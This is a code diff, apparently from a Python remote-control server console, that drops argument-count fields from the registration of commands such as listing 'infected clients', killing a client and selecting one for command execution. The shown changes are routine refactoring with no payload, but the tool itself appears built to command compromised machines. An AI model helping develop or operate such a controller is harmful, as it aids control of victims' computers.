@@ -23,8 +23,6 @@ if TYPE_CHECKING:
     "exit",
     "exit",
     "Removes all clients and exits",
-    0,
-    0,
     [],
 )
 class ExitShell(LocalCommand):
@@ -49,8 +47,6 @@ class ExitShell(LocalCommand):
     "list_clients",
     "list_clients { subset of clients }",
     "Lists your infected clients",
-    0,
-    1,
     [ArgumentType.optional_string],
 )
 class ListClients(LocalCommand):
@@ -89,8 +85,6 @@ class ListClients(LocalCommand):
     "remove_client",
     "remove_client [ client name ]",
     "Kills and removes a client",
-    1,
-    1,
     [ArgumentType.string],
 )
 class RemoveClient(LocalCommand):
@@ -109,8 +103,6 @@ class RemoveClient(LocalCommand):
     "rename_client",
     "rename_client [ current client name ] [ new client name ]",
     "Renames a client",
-    2,
-    2,
     [ArgumentType.string, ArgumentType.string],
 )
 class RenameClient(LocalCommand):
@@ -139,8 +131,6 @@ class RenameClient(LocalCommand):
     "clear",
     "clear",
     "Clears the console",
-    0,
-    0,
     [],
 )
 class ClearScreen(LocalCommand):
@@ -154,8 +144,6 @@ class ClearScreen(LocalCommand):
     "select",
     "select [ client name ]",
     "Selects a client for command execution",
-    1,
-    1,
     [ArgumentType.string],
 )
 class SelectClient(LocalCommand):
@@ -181,8 +169,6 @@ class SelectClient(LocalCommand):
     "deselect",
     "deselect [ client name ]",
     "Deselects a client",
-    1,
-    1,
     [ArgumentType.string],
 )
 class DeselectClient(LocalCommand):
@@ -208,8 +194,6 @@ class DeselectClient(LocalCommand):
     "help",
     "help { command name }",
     "Displays help about command(s)",
-    0,
-    1,
     [ArgumentType.optional_string],
 )
 class Help(LocalCommand):
